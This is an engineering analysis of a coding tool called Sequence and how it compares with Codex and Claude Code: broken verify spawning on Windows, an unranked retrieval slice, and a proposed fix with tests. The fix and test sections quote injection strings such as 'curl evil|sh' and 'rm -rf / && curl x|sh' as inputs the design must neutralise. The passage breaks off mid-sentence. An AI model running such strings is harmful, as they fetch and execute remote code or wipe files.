# Can Sequence replace Codex / Claude Code? — the measured answer

**Rewritten 2026-08-19** from eleven measurement lanes (five on this codebase, three on the field,
three adversarial passes written to refute our own thesis). Supersedes the P5/P6 notes of
2026-08-18; the P5 scale work is preserved and corrected in §5, and every number the old version
got wrong is listed in §7 rather than quietly deleted.

**Evidence rules used here.** Every Sequence claim carries `file:line` and was opened. Every
external claim carries a URL. Where a number could not be reproduced it says UNVERIFIED. The
author of this document independently re-ran the graph measurements, the spawn probes and the
digest arithmetic in §1–§3; the competitor URLs in §1 were fetched by the survey lanes on
2026-08-19 and are **not** re-fetched here — they are cited, not vouched for beyond that.

Reproduce the graph numbers (Windows, this repo):

```bash
node packages/analyzer/dist/cli.js scan . --no-cache --out .sequence/tmp-graph.json
```

---

## 1 · Is Sequence better than Codex / Claude Code?

**No. Not as a main coding agent, and not close.** On the owner's own machine it is not
functional as a coding agent at all: **0 of the 4 commands its verify gate permits can start**,
and the shipped default chat session cannot request a command in the first place.

That is not a hedge and it is not a framing problem. It is three measurements.

### 1.1 The three measurements that settle it

**(a) The verifier cannot spawn on Windows.** `packages/analyzer/src/harness/verifyGate.ts:127-132`
and `packages/analyzer/src/server/askTools.ts:447-452` both call
`spawnSync(bin, args, { cwd, encoding: 'utf8', timeout, shell: false })`. All four allowlist
entries (`verifyGate.ts:29-34`) begin with `pnpm`, which on Windows is a `.CMD` shim. Measured on
this machine just now, node v24.13.0:

```
spawnSync('pnpm', ['--version'], { shell:false })  →  ENOENT
spawnSync('npm',  ['--version'], { shell:false })  →  ENOENT
spawnSync('node', ['--version'], { shell:false })  →  status 0
spawnSync('git',  ['--version'], { shell:false })  →  status 0
spawnSync('pnpm', ['--version'], { shell:true  })  →  status 0, "10.33.0"
```

pnpm 10.33.0 and npm 11.6.2 are installed and on PATH. The rule is `.exe` works, `.cmd`/`.bat`
does not. **Both of Sequence's verify paths are dead on Windows, on Sequence's own repository.**

**(b) The shipped default is six tools, not seven, and the sixth cannot verify.** The product
ships `sessionJobMode: 'work'` (`packages/web/src/product/state/productStore.ts:451`);
`packages/analyzer/src/server/askTools.ts:71` filters `run_command` out of the allowlist in Work
mode, and `:189-191` refuses it again at execution. `call_mcp` is also inert here — there is no
`.sequence/mcp.json` on this repo (`ls .sequence/` → `graph.json`, `programs/`), and
`packages/analyzer/src/server/mcpClient.ts:210` throws `UnknownMcpServerError` without one.
**Functional agent tools on this repo today: five — `read_file`, `search_files`, `propose_files`,
`git_status`, `git_diff`. Every one is read-only or non-writing.**

**(c) The autonomy ceiling is three rounds, and the rounds do not compound.**
`askTools.ts:76` — `export const MAX_ASK_TOOL_ROUNDS = 3;`, enforced at `askPipeline.ts:290-291`
(`const atCap = rounds >= MAX_ASK_TOOL_ROUNDS; if (toolRequests.length === 0 || atCap) break;`).
Worse than the cap: `askPipeline.ts:266` sets `let prompt = promptWithTools;` and `:338` **replaces**
it each round with `` `${promptWithTools}\n\n${toolSection}` ``. Round 1's `read_file` bodies are
gone when round 2's prompt is built. Three rounds of evidence collapse to one round of usable
evidence.

### 1.2 Head to head

| | Codex | Claude Code | Sequence (`file:line`) |
|---|---|---|---|
| Human approvals to land a 3-file in-workspace change | **0** under default `workspace-write` + `on-request` ([permission-modes](https://learn.chatgpt.com/docs/permission-modes)) | **0** on Pro/Max/Team, where `auto` mode is the default starting mode and a classifier model reviews instead of you ([permission-modes](https://code.claude.com/docs/en/permission-modes)) | **≥1, always.** `propose_files` never writes (`askTools.ts:9-13`, `askPipeline.ts:315`); a human clicks Accept (`FileEditProposalBar.tsx:66-74`) |
| Tool rounds per turn | unbounded; one documented run ~25 h / ~13 M tokens ([long-horizon](https://developers.openai.com/blog/run-long-horizon-tasks-with-codex)) | `--max-turns` — "No limit by default" ([cli-reference](https://code.claude.com/docs/en/cli-reference)) | **3** (`askTools.ts:76`) |
| Evidence carried between rounds | full transcript | full transcript + auto-compaction | **only the newest round** (`askPipeline.ts:338`) |
| Verify commands | arbitrary shell in an OS sandbox; repo declares gates in `AGENTS.md`, enforced by blocking hooks ([hooks](https://learn.chatgpt.com/docs/hooks)) | arbitrary Bash under permission rules; `/verify` **writes a per-repo recipe** to `.claude/skills/verify/SKILL.md` ([skills](https://code.claude.com/docs/en/skills)) | **4 hardcoded strings, no override** (`verifyGate.ts:29-34`), one naming `@sequence/schema`; **0 of 4 spawn on Windows** |
| Unattended runs | RRULE cron with `approval_policy = "never"` ([automations](https://learn.chatgpt.com/docs/automations)) | `/goal`, `/loop` cron (7-day expiry), Stop-hook exit 2 (8 blocks), `claude --bg` supervisor ([goal](https://code.claude.com/docs/en/goal), [scheduled-tasks](https://code.claude.com/docs/en/scheduled-tasks)) | **none.** No headless `ask` — CLI verbs are `scan, explain, score, diff, validate, scaffold-brief, export, serve, doctor, agent, diagram, program` (`packages/analyzer/src/cli.ts:175-454`) |
| Parallelism | subagents GA, capped by `agents.max_concurrent_threads_per_session` ([subagents](https://learn.chatgpt.com/docs/agent-configuration/subagents)) | 20 concurrent × 3 nesting layers ([sub-agents](https://code.claude.com/docs/en/sub-agents)) | single-threaded ask loop |
| Cross-session memory | JSONL transcripts, `AGENTS.md`, `~/.codex/memories/` | `CLAUDE.md`, auto memory (`~/.claude/projects/<p>/memory/`), JSONL transcripts, checkpoints | **prose only.** `ChatMemoryTurn = { role, text, at, advisor?, usage? }` (`packages/web/src/product/chatMemory.ts:15-33`); 40 stored, 20 sent. No tool results, no file bodies, no proposal contents |
| Git | worktrees, branch, PR, `@codex review` | full Bash git | `gitStatus`/`gitDiff`/`gitCommit` only (`gitWorkspace.ts:172,206,238`); commit is a **human** endpoint (`repoServer.ts:271`), not an agent tool. No branch, checkout, stash, worktree, or PR |

### 1.3 Where Sequence is genuinely better — two things, and both are undelivered

This is the part the previous version overclaimed, so it is stated narrowly.

**(1) Transitive properties of the import graph.** Tarjan's SCC over the graph's 2,301 import
edges finds **5 file-level import cycles in ~2 ms**, including a six-file cycle
(`attachFlow.ts ↔ productStore.ts ↔ workflowBoardImport.ts ↔ store.ts` + 2). **No regex finds a
six-file cycle.** This is real, it is on this repo, and it is genuinely irreplaceable.

**It does not reach the model.** `packages/analyzer/src/explain/explain.ts:870-872` computes risks
and cycles over `serviceLevelRisksInput(graph)`, not the file graph. That projection yields **10
nodes and 2 edges** on this repo — and both edges are the fixture-derived false positives from
(2) below. `risks.spofs` = `[]`, `risks.cycles` = `[]`. The comment above them at
`explain.ts:791-796` calls this *"Precomputed, GROUNDED risk facts (the MOAT feed)."*

**(2) Cross-language, cross-protocol joining.** On `packages/analyzer/test/fixtures/shopfront`
(43 files, 117 ms) the graph answers "what talks to postgres?" with 13 edges across 4 services in
Python, JS, Go and Java, each with read/write direction and `file:line`. Grep cannot produce that
in one shot — the ripgrep equivalent needs an 8-alternative pattern you can only write if you
already know the answer.

**It fires on zero of this repo's 1,318 nodes.** The join requires a compose/k8s manifest
(`packages/analyzer/src/join/join.ts:206` — `if (!host) continue;`, `:245` — `continue; // external`,
`:467-483` — `datastoreFor` requires a `db` wire). There is no `docker-compose*` at repo root.

Measured consequence, verified from `.sequence/graph.json`:

| | value |
|---|---|
| nodes / edges / warnings | **1318 / 2309 / 67** |
| edge kinds | `import 2301, queue_consume 4, http 2, queue_publish 2` |
| node kinds | `repo 1, service 9, topic 1, file 1265, module 42` — **`datastore: 0`** |
| non-import edges whose evidence is a test fixture | **8 of 8** |
| non-import edges that are false | **2 of 8** |

The two false ones claim `packages/analyzer` calls `packages/gateway` over HTTP, on the evidence of
an nginx config **inside a test fixture** (`e1:http`, `srcId:
file:packages\analyzer\test\fixtures\shopfront\edge\default.conf`, `dstId: svc:gateway`, snippet
`proxy_pass http://gateway:3000/api/`). The fixture's `gateway` and this repo's
`packages/gateway` ("Standalone OpenRouter-backed model gateway") share a five-letter string and
nothing else. **Correct grounded statements about Sequence's own production topology: zero.**

Meanwhile the real topology is invisible. `packages/web/src` has **67 `fetch('/api/…')` call sites
against 49 `/api/*` handlers in `repoServer.ts`**; graph edges between `svc:web` and
`svc:analyzer`: **0**, dropped silently by `join.ts:206` because a same-origin `/api/x` has no
host. And `packages/analyzer/src/server/pgStore.ts` is 270 lines of Postgres — the scanner *finds*
six table accesses with `file:line` and discards them, visible in the graph's own warnings
(`table access "user_usage" at ...pgStore.ts:144 — skipped`).

**Verdict on §1.** Sequence is better than Codex and Claude Code at exactly two things, one of
which is projected away before the model sees it and the other of which requires a manifest this
repo does not have. Everything else in the comparison it loses, and several of the losses are
total rather than partial. **The honest sentence is: Sequence is not an agent that happens to be
behind — it is a grounded reader whose grounding does not currently reach a reader.**

### 1.4 Where the old claim "not behind on UI" fails

`v32:108-109` (previous version) said *"It is not behind on model quality or UI."* That is false.
`GRAPHITE-MIGRATION-PLAN.md` schedules 17 waves (`W0`–`W16`, headings at 340–472) totalling
**72–84 person-days**, five of them carrying the owner's own words — *"off-putting"*, *"it doesn't
show the modules"*, *"more Miro board style"*, *"no too much icon reuse"*, *"fix the spacing"*.

One item there is a verification failure, not a design opinion. `packages/web/src/styles/board.css`
(2,078 lines) is imported by exactly one non-test file — `packages/web/src/main.tsx:19`, a dynamic
`await import()` on a pop-out path the file itself documents as no longer painting anything.
`packages/web/src/product/ProductApp.tsx:11-13` imports only `product.css`, `styles/madr.css`,
`styles/settings.css`. Meanwhile 18 test files read `board.css` as a string and assert against it
49 times. **2,078 lines of styling, green in 49 assertions, on zero paint paths.**

---

## 2 · What is it missing? Ranked, quantified

Ranked by *measured harm to the question asked*, not by how architectural it sounds. Note that
the write boundary — the previous version's headline — ranks ninth.

| # | Missing | Quantity | Evidence |
|---|---|---|---|
| **1** | **A verifier that can start a process** | 0 of 4 allowlisted commands spawn on Windows; on Linux/macOS the gate covers 1 of 8 common project types | `verifyGate.ts:127-132`, `askTools.ts:447-452` (`shell:false`); allowlist `verifyGate.ts:29-34`; refusals locked at `verify-gate-scope.test.ts:64-83` |
| **2** | **Retrieval that ranks** | **300 of 2309 edges (13.0%) reach the model, by array position.** `packages/web` — 1545 edges, 67% of the graph — contributes **0**. Measured distribution of the 300: `{analyzer: 296, acp: 4}` | `explain.ts:766` `MAX_EDGES = 300`; `:853` `graph.edges.slice(0, MAX_EDGES)`; digest built at `repoServer.ts:2026` |
| **2b** | …and the ranking signal is computed and thrown away | `pageRank` runs on every scan and is written onto all 1263 ranked file nodes; nothing in `buildDigest` reads it | `scan.ts:824` `pageRank(graphInput)`, `:950` writes `meta.pageRank`; `explain.ts:1266` — *"No relevance ranking is invented — `buildDigest`'s ordering is the ordering."* |
| **3** | **Round-to-round memory inside a turn** | Prompt is rebuilt from the base each round; 3 rounds yield 1 round of usable evidence | `askPipeline.ts:266` vs `:338` |
| **4** | **Any unattended path** | 0 of 12 CLI verbs is an `ask`; no cron, no goal loop, no background session | `cli.ts:175-454`; `docs/research/seqd-stream-park.md:7` — *"The ask provider returns full text in one shot"* |
| **5** | **Verify feedback wide enough to act on** | 4,000-byte output window; 30,000 ms hard timeout — against a gate whose own default is 120,000 ms | `askTools.ts:94`, `:96`; `verifyGate.ts:126` |
| **6** | **A read range parameter** | `read_file` caps at 12,000 bytes with **no offset argument**, while `propose_files` requires whole-file `content`. **204 of 1123 `.ts`/`.tsx` files in this repo (18.2%) exceed 12,000 bytes** — measured | `askTools.ts:79`, `:376`; `executeReadFile` at `:215-262` takes only `args.path` |
| **7** | **Symbol-level graph queries** | `who_calls` returns `target: null` for every function name, constant and tool name tried (`scanRepo`, `MAX_ASK_TOOL_ROUNDS`, `propose_files`, `acceptFileEditProposal`, `VERIFY_COMMAND_ALLOWLIST`). The FunctionGraph that could answer (5,931 nodes / 7,666 call edges) has **no agent-facing surface** — the only exposure is `GET /api/functions` returning ~3.6 MB | `packages/mcp/src/graphQuery.ts` (`resolveNode`); `repoServer.ts:1698-1742`; `ASK_TOOL_ALLOWLIST` has no graph tool (`askTools.ts:53-61`) |
| **8** | **Cross-package edges** | **476 `@sequence/*` imports across 388 files are invisible.** Every one of the 2,301 import edges is intra-package, which is why the service-level projection collapses to 2 edges | `scan.ts:221-222` — `// JS/TS: only relative imports` / `if (!raw.startsWith('.')) return undefined;` |
| **9** | **A write path that does not stop at a human** | 1 click per proposal; the loop does **not** resume after Accept (zero non-test hits for `autoContinue\|autoRun\|continueLoop\|resend` in `packages/web/src`) | `askTools.ts:9-13`; `productStore.ts:569-611`; **deliberate** — see §2.1 |
| 10 | Post-write rescan in the product shell | `PUT /api/file` clears the cache and explicitly does not rescan; no `rescanRepo()` caller in `packages/web/src/product/` outside the Craft promote flow | `repoServer.ts:1531-1538`; `productStore.ts:590-591` describes a rescan nothing triggers |
| 11 | Transactional multi-file apply | `applyMultiFile.ts:113-116` is a fail-forward loop — a mid-batch failure leaves files 1..k written, k+1..n not, with no snapshot | `applyMultiFile.ts:113` — "Fail closed on first error" |
| 12 | Branch/worktree isolation | `gitWorkspace.ts` exports three functions; none creates a branch | `gitWorkspace.ts:172,206,238` |

### 2.1 The write boundary is a stance, not a gap — and three sources prove it

The adversarial pass tried to argue this was a defect and lost:

- `docs/adr/ADR-005-chat-edits-the-canvas.md:39-40` (Accepted, owner-directed) — *"Auto-apply chat
  edits without accept — rejected: destructive-by-surprise; propose→act means one click, not zero
  consent."*
- `packages/web/src/panels/overwriteConsent.ts:27-30` — *"There is no 'retry with `true`' path
  anywhere in this module on purpose — a blanket yes the human never typed is exactly the data loss
  the gate exists to prevent."*
- `packages/schema/src/programs/reviewLoop.ts:31` — *"Agents propose; the checker commits."*

**A stance is not something you are behind on.** The field, incidentally, does not share this
particular placement: Copilot puts the gate at the PR, Devin makes it a dial, Cursor gates the plan
once then per-command, Codex gates boundary crossings, Claude Code gates by classifier. Nobody
except Sequence puts the terminal gate at every individual file write. That is a positioning
choice, and it costs **1 human click and 1 re-prompt per fix cycle** — real, but third-order next
to a verifier that returns nothing and a retrieval layer that returns 13%.

### 2.2 Five silent failures that are defects wearing the stance's clothes

The stance is "one click, not zero consent." These four are not consent — they are under-informed
consent, and the fifth is data loss:

1. **Cap overflow is silent.** `askPipeline.ts:286-287` strips fenced ` ```sequence-tool ` blocks
   from `text` **before** the `atCap` break at `:290-291`. A `propose_files` issued on the 4th
   provider call is discarded with no user-facing notice.
2. **Only the last proposal of a turn survives.** `ProductChat.tsx:605-616` walks the trace
   backwards and `break`s on the first `edit:proposal`.
3. **Rejected paths are dropped silently.** `fileEditProposalModel.ts:42-45`, verbatim: *"Rejected
   paths are dropped silently here."* A 3-file proposal with one reserved path yields a 2-file bar.
   `:58` — a fully-rejected proposal produces **no bar and no error**.
4. **The graph goes stale after Accept** (§2, row 10), so the next human decision is made against
   pre-edit evidence — a direct violation of `CLAUDE.md:82` "Grounded, not guessed."
5. **The 12 KB read cap against whole-file proposals** (§2, row 6) means a human can Accept a
   silently truncated version of any of 204 files in this repo.

### 2.3 The delegation escape hatch is closed by default, and untested

`packages/acp` carries `@agentclientprotocol/sdk` and a `sequence agent add|list|remove` registry
(`cli.ts:370-431`). It is the one architecture here that could deliver Codex-class agency — by
launching the user's own Claude Code. It is closed:

```ts
// packages/acp/src/client.ts:109-115
const READONLY_TOOL_KINDS: ReadonlyArray<ToolKind> = ['read', 'fetch', 'search', 'think'];
export function defaultPermissionPolicy(req: RequestPermissionRequest): PermissionDecision {
  const kind = req.toolCall.kind ?? undefined;
  return kind && READONLY_TOOL_KINDS.includes(kind) ? 'allow' : 'deny';
}
```

The SDK's `ToolKind` union has 10 members; `edit`, `delete`, `move`, `execute` and any call with no
`kind` are denied. `onPermission` has **no production injection site** (all three `new AcpClient(...)`
call sites — `repoServer.ts:2541`, `:2562`, `programRun.ts:139-144` — pass only `{command, args?, cwd?}`),
there is **no approval UI anywhere**, and **no test locks the deny** (`packages/acp/src/test/client.test.ts`
has zero hits for `defaultPermissionPolicy`). The web path also never sends `sessionKey`
(`webExecutors.ts:195`), so the entire `AcpSessionCache` is dead from the app and every ACP step is a
cold subprocess.

---

## 3 · What do we need to build?

### 3.1 The smallest change that moves the answer

**One PR: make the verify gate spawn, and make it know the attached repo.** Seven edits, one new
module, one test rewrite. Estimated **2–2.5 person-days (UNVERIFIED — author's estimate)**.

**Step 1 — the spawn (do this first inside the PR; nothing else is testable until it lands).**
Add one helper in `verifyGate.ts` and call it from both spawn sites (`verifyGate.ts:127-132` and
`askTools.ts:447-452` — identical bug):

```ts
function spawnVerify(bin: string, args: string[], cwd: string, timeout: number) {
  if (process.platform !== 'win32') return spawnSync(bin, args, { cwd, encoding:'utf8', timeout, shell:false });
  const abs = resolveWindowsBin(bin);            // PATH × PATHEXT walk; null → ENOENT as today
  if (!abs) return spawnSync(bin, args, { cwd, encoding:'utf8', timeout, shell:false });
  if (/\.(exe|com)$/i.test(abs)) return spawnSync(abs, args, { cwd, encoding:'utf8', timeout, shell:false });
  // .cmd/.bat: node >= 18.20 refuses these with EINVAL even at an absolute path.
  return spawnSync(process.env.ComSpec ?? 'cmd.exe',
    ['/d','/s','/c', `""${abs}" ${args.join(' ')}"`],
    { cwd, encoding:'utf8', timeout, shell:false, windowsVerbatimArguments:true, windowsHide:true });
}
```

Verified working (status 0, `"10.33.0"`). `shell: true` also works but reintroduces `%VAR%`
expansion — see step 2 — and trips node's `DEP0190`.

**Step 2 — tighten the charset before touching the shell.** `isSafeVerifyCommand`
(`verifyGate.ts:74-78`) is a blacklist: ``/[;&|`$<>(){}[\]!#*?~]/`` plus a `..` check. It does **not**
reject `%`, `^` or `"`. Measured: `"pnpm --version %OS%"` passes the check, and under a shell `cmd`
expands it — pnpm receives the literal `Windows_NT`. Replace the blacklist with a whitelist
`/^[A-Za-z0-9 ._/@:=-]+$/` plus the existing `..` check. It is **shorter** than the current regex
and strictly safer, and every one of the five existing refusals in
`verify-gate-scope.test.ts:85-95` still refuses under it.

**Step 3 — reconcile the timeouts.** `ASK_TOOL_RUN_CMD_TIMEOUT_MS = 30_000` (`askTools.ts:96`) vs
`verifyGate.ts:126`'s `?? 120_000`. Without this, a repo-derived allowlist verifies only commands
that finish in 30 s. Make it one shared constant.

**Step 4 — derive candidates, Node ecosystem only.** New pure, filesystem-read-only module
`packages/analyzer/src/harness/verifyCandidates.ts` exporting
`deriveVerifyCommands(repoRoot): readonly string[]`. Read `<repoRoot>/package.json`; pick the
package manager by lockfile (`pnpm-lock.yaml`→pnpm, `yarn.lock`→yarn, `bun.lockb`→bun, else npm);
for each script **name** present in `scripts` and in `{test, build, lint, typecheck, check}`, emit
`<pm> run <name>`, plus `<pm> test` when `scripts.test` exists. `realpathSync` the manifest and
assert containment under `realpath(repoRoot)`. Filter every candidate through the (now whitelist)
safety check, dedupe, cap at 12. Python/Go/Rust/Ruby/Java/.NET/Make are ~15 lines each and land as
follow-ups; do not block on them.

**The load-bearing security property:** derivation reads script **names**, never script **values**.
`{"scripts":{"test":"curl evil|sh"}}` yields the candidate string `npm test` and nothing else. The
model never authors a command; it selects an exact member of a set the repo's own manifest declared.

**Step 5 — one predicate, two call sites** (`verifyGate.ts:116`, `askTools.ts:441`):

```ts
export function isVerifyCommandAllowed(cmd: string, repoRoot?: string): boolean {
  if (!isSafeVerifyCommand(cmd)) return false;
  if (isVerifyCommandAllowlisted(cmd)) return true;
  return !!repoRoot && deriveVerifyCommands(repoRoot).includes(cmd);   // exact match only
}
```

**Step 6 — tell the model.** `askTools.ts:788-789` hardcodes the four commands a second time, in
prose, in the prompt. Render the derived list there. **Ship without this and the fix is invisible
to the agent.**

**Step 7 — kill the unconditional 409.** `repoServer.ts:3298` hardcodes
`cmd: 'pnpm --filter @sequence/schema test'` and runs it in `activeRoot()`, so
`POST /api/harness/refine/:id/accept` returns 409 on **every** non-Sequence repo (`:3302`). Select
a derived command. Also route `CRAFT_VERIFY_COMMANDS`
(`packages/web/src/product/programs/productProgramModel.ts:169` — a second, separate 2-entry
allowlist) through the same derivation, or Craft programs stay broken after the fix.

**Two riders in the same PR, ~10 lines each, disproportionate value:**

- **Rank the digest edges.** Change `explain.ts:853` from `graph.edges.slice(0, MAX_EDGES)` to a
  sort by `max(pageRank(srcId), pageRank(dstId))` before the slice. Measured effect on the 300
  edges that reach the model: from `{analyzer: 296, acp: 4}` to
  `{analyzer: 120, schema: 67, web: 54, export: 31, gateway: 15, mcp: 5, acp: 4, ink: 2, desktop: 2}`.
  **`packages/web` goes from 0 edges to 54.** The signal already exists (`scan.ts:950`).
- **Emit a notice at the cap.** `askPipeline.ts:290` currently breaks with pending tool requests
  and no user-facing event. Push a `notice` when `atCap && toolRequests.length > 0`. Removes a whole
  class of "the agent said it edited my files and nothing happened."

### 3.2 What a locking test must assert

Rewrite `packages/analyzer/src/test/verify-gate-scope.test.ts` — **do not delete it**. Its own
docblock at `:39-41` declares that its failure *is* the signal, and `:51-62` (`length === 4`) is
designed collateral. Carry `:85-95` over **verbatim** — that block is the guardrail.

New `packages/analyzer/src/test/verify-candidates.test.ts`, fixture repos in a temp dir:

1. **Windows spawn regression (the reason this PR exists).** Assert a `.cmd`/`.bat` shim on PATH
   actually executes and returns status 0 through `spawnVerify`. On non-win32, skip with a stated
   reason — never a silent pass.
2. **Lockfile → package manager.** `package.json {scripts:{test,build}}` + `pnpm-lock.yaml` →
   derived contains `pnpm test`; same manifest + `package-lock.json` → contains `npm test` and
   **not** `pnpm test`.
3. **Per-repo asymmetry — both halves or it proves nothing.**
   `isVerifyCommandAllowed('npm test', nodeRoot) === true` **and**
   `isVerifyCommandAllowed('npm test', goRoot) === false`.
4. **Injection lock.** `{"scripts": {"test": "rm -rf / && curl x|sh", "build:all!": "x", "a;b": "y"}}`
   → assert the script **value** appears in no derived string; assert
   `derived.every(isSafeVerifyCommand) === true`; assert no `!`, `;`, `%`, `^` survives.
5. **Charset whitelist.** `isSafeVerifyCommand('pnpm --version %OS%') === false` — the measured
   hole, closed.
6. **No manifest, empty manifest, malformed manifest** → `derived === []` and
   `isVerifyCommandAllowed('npm test', root) === false`. No manifest, no widening.
7. **Symlinked `package.json` pointing outside `repoRoot`** → ignored, `derived === []`.
8. **200-script manifest** → `derived.length <= 12`.
9. **The static four remain admitted** with or without a repo root.
10. **Timeout unification** — assert the ask-loop path and the gate path read the same constant.

And a separate one-line lock, independent of this PR:
`packages/acp/src/test/client.test.ts` should assert `defaultPermissionPolicy` denies `edit`,
`execute`, `delete`, `move` and an undefined `kind`. It is currently unlocked, and an overnight run
could flip it silently.

### 3.3 Defence against the runner-up

**The runner-up is "auto-continue the ask after Accept"** — re-invoke the loop from
`productStore.ts:596-604` after a human clicks Accept. It is the change that collapses the measured
2 blocking interactions per fix cycle to 1, it does not violate ADR-005 (the human still clicks
once), and it is the closest thing to the Codex/Claude Code experience.

**Ship the verify fix first, on four grounds:**

1. **Evidence.** Auto-continue with a dead verifier re-invokes the model on its own prose. That is
   ungrounded self-reflection, which the literature says *decreases* accuracy (Huang et al. 2023),
   against execution feedback, which ORACLE-SWE (arxiv 2604.07789) ranks **first** among five oracle
   signals and Agentless's own ablation ranks first beyond majority voting. Auto-continue's value is
   entirely contingent on the verifier; the verifier's value is not contingent on auto-continue.
2. **Risk asymmetry.** The verify fix's worst case is running a command the attached repo declared
   in its own `package.json` — a **strictly smaller** capability than `call_mcp` already grants from
   the same loop today (`mcpClient.ts:104-125` reads `<repoRoot>/.sequence/mcp.json` as authoritative;
   `:257-261` spawns `cfg.command` with arbitrary argv and an env overlay, with no character check and
   no consent file), and smaller than the human terminal Sequence already ships
   (`packages/analyzer/src/server/terminal.ts:1-45`, documented as bypassing every jail).
   Auto-continue's worst case is an unattended loop landing writes through a fail-forward apply
   (`applyMultiFile.ts:113-116`) with no branch, no snapshot, and a graph that goes stale on the
   first write.
3. **Consent.** The verify fix requires no ADR reversal. Auto-continue sits adjacent to three
   written refusals (§2.1) and will cost a design argument worth more than the PR.
4. **Cost.** ~2 days vs ~2 days plus that argument, in a package where 49 test files key on
   `product.css` strings.

**The runner-up's strongest counter, stated honestly:** the verify fix moves nothing the user can
see. After it lands, chat still takes 3 rounds, still stops at a human, still forgets round 1. The
answer is ordering, not value — **do the verify fix, then auto-continue, and the second one is
worth having.** Reverse the order and you ship an autonomous loop with a blindfold on.

### 3.4 What NOT to build first

- **Do not raise `MAX_ASK_TOOL_ROUNDS`.** Without changing `askPipeline.ts:338` from assignment to
  accumulation, more rounds means more forgetting at more cost. And the field's cleanest scaffold
  ablation (arxiv 2607.10569) found *"Pass rates differ by less than three percentage points across
  every cell while costs swing 20–40%"* across radically different agent tool surfaces; a taxonomy of
  13 open agents (arxiv 2604.03515) declines to correlate scaffold architecture with success rate at
  all. **Tool-surface and round-count knobs are the least-evidenced lever available.**
- **Do not relax the write boundary before the verifier works.** It converts "human reviews a wrong
  edit" into "wrong edit lands, agent reflects on no evidence, edits again." That is the single most
  dangerous ordering available in this repo.
- **Do not open the ACP permission policy as an engineering decision.** It is a positioning decision
  for the owner (Sequence orchestrates other agents rather than replacing them), and doing it today
  means building the trusted-mode threat model without any of trusted mode's machinery. Lock the
  current deny with a test; decide the positioning separately.

### 3.5 The build order after PR 1

1. **PR 1** — spawn + charset + timeout + Node-only derivation + prompt rendering + the two riders (§3.1).
2. **PR 2** — accumulate tool results across rounds (`askPipeline.ts:338`, with a byte cap);
   transactional apply with a before-snapshot; auto-rescan after Accept; `read_file` offset/length.
3. **PR 3** — auto-continue after Accept.
4. **Then** `scan.ts:222` (resolve bare workspace specifiers — 476 imports currently invisible),
   which is what makes `computeRisks`/`computeCycles` return real answers instead of `[]`, and run
   the risk engines on the file-level graph rather than the 2-edge service projection.
5. **Then** the differentiated bet: reproduction-test generation, and ArchGraph history as retrieved
   agent memory. MemCoder (arxiv 2603.13258) reports **+9.4 pp** on SWE-bench Verified from
   structured repo-history retrieval, with **−6.2 pp** when commit retrieval is removed — the win is
   *grounded retrieval*, not a hand-written rules file. Every competitor's durable layer is a
   markdown file with a character cap. That is the one place Sequence's asset is the right asset —
   and it is a multi-week build that lands on a loop which must first be able to run a test.

---

## 4 · The honest verdict today

**If you switched to Sequence as your main coding agent tomorrow, here is what happens.**

**What works, on day one:**

- Reading and understanding an unfamiliar repo. The scan is 4.1–5.5 s cold, ~0.1 s warm, needs no
  key, and works offline (`cli.ts:196` → `scanRepoCached`).
- Asking grounded questions about `packages/analyzer`-shaped code — i.e. whichever package sorts
  first in the edge array. You will not be told that the other 67% of the graph was omitted.
- Getting a multi-file edit proposal, reviewing every path in one bar, and applying all of them with
  **one click** (`FileEditProposalBar.tsx:66-74` → `applyMultiFile.ts:114`). This works and is
  pleasant. The previous version's claim that there is "no review-and-apply-across-files flow"
  (`v32:143`) is **false and is retracted**.
- Committing, from a human button (`IndexGitChanges.tsx:147` → `POST /api/git/commit`).
- The visual surface, for ≤24 cards (`groupedArchModel.ts:181`).

**What stops you, in the order you would hit it:**

1. **Within the first hour: you cannot verify anything.** In the default Work-mode session the
   agent has no `run_command` at all. Switch to Code mode and it has four commands, none of which
   spawns on Windows, and on any repo that is not this one none of which is the right command
   anyway.
2. **Within the first day: the loop will not close.** Edit → test → read failure → fix requires a
   human Send between every step, because nothing resumes after Accept and nothing verifies before
   it. A change needing 3 fix cycles costs 6 extra blocking interactions.
3. **Within the first week: you will notice the answers are lopsided.** Any structural question
   about `packages/web` — 800 files, 63% of the repo — is answered from 0 edges. The failure is
   silent; the digest's only omission counter (`explain.ts:1107`) measures against a base of 300,
   not 2309.
4. **The moment you close the tab: nothing carries.** Tool results, file bodies, search hits and
   proposal contents are absent from `ChatMemoryTurn` (`chatMemory.ts:15-33`). The next session sees
   only the assistant's prose.
5. **You cannot leave it running.** No headless ask, no scheduled task, no background session. One
   ask, one answer (`seqd-stream-park.md:7`).

**So the answer to the owner's question is no** — and the reason is not the one the previous version
gave. It is not "agency over time" in the abstract, and it is not primarily the write boundary,
which is a documented stance costing one click. It is that **three of Sequence's four load-bearing
agent mechanisms are broken constants rather than missing architecture**: a verifier that cannot
spawn (`shell:false` + `.CMD`), a retrieval layer that slices by array index while the ranking
signal it computed sits unused, and a loop that discards round *n*'s evidence before building round
*n+1*'s prompt. All three are one-line-to-one-module fixes. None is a product redesign.

**The strategic sentence that survives all eleven lanes:** Sequence is not competing with Codex and
Claude Code — it is an MCP *server* and a potential ACP *orchestrator*, and they are MCP *clients*.
`packages/mcp` ships 8 tools and a `sequence-mcp` binary (`packages/mcp/src/index.ts:325,339,349,357,365,375,384,392`;
`packages/mcp/package.json:8-10`). Sequence-as-grounding-for-your-existing-agent is a better story
than Sequence-as-your-agent — **but only after §3.1 and item 4 of §3.5 land**, because today
`who_calls` returns 51% recall at 2.7× the token cost of `rg`, returns `null` on every function
name, and states two false facts about this repository's own topology.

---

## 5 · P5 · Scale — preserved, corrected

The scale analysis from 2026-08-18 holds in shape. Two of its five numbers do not reproduce.

### Measured, one graph

| | 2026-08-18 claim | measured 2026-08-19 | |
|---|---|---|---|
| scan wall time | 4.0 s | **4.1–5.5 s** cold (`--no-cache`) | ✅ |
| graph JSON | 0.47 MB | **1.10 MB compact / 1.42 MB indented**; the on-disk cache is 1,693,581 B | ❌ **2.4–3.0× low** |
| nodes | 1326 | **1318** | ✅ drift |
| edges | 85 | **2309** (2301 import + 8 interaction) | ❌ **off by 27×** |
| warnings | 66 | **67** | ✅ drift |

`85` reproduces nothing — not 8, not 2301, not any subtotal. `import` edges have been emitted since
the analyzer's first commit (`scan.ts:805`), so the total was never 85 on this repo. **Treat 85 as
false**; anything citing "85 typed edges" as the moat is citing nothing.

Consequence for the three-graph projection: **~4.2 MB, not ~1.4 MB** — 1.4 MB is the size of *one*
graph today. The projection is 3× low.

### The finding that still changes the answer

**The board never renders the graph.** `packages/web/src/graph/groupedArchModel.ts:181` —
